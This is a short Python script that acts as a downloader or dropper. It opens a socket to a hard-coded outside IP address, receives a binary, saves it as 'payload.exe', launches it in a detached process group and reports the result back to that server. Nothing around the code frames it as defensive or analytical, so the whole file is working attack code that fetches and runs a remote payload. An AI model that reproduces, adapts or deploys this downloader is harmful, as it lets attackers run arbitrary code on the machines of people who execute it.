import socket
import subprocess

global ip,downloader_socket
ip = "157.230.232.167"
downloader_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
downloader_socket.connect((ip,2003))


def get_payload():
    try:
        global ip,downloader_socket
        payload_bytes = downloader_socket.recv(409600)
        payload_file = open("payload.exe",'wb')
        payload_file.write(payload_bytes)
        payload_file.close()
        return True
    except socket.error:
        return False

def exec_payload(name):
    subprocess.Popen(name,creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)

def main():
    global downloader_socket
    if(get_payload()):
        exec_payload("payload.exe")
        downloader_socket.send("1".encode())
    else:
        downloader_socket.send("0".encode())
    downloader_socket.close()

if __name__ == '__main__':
    main()
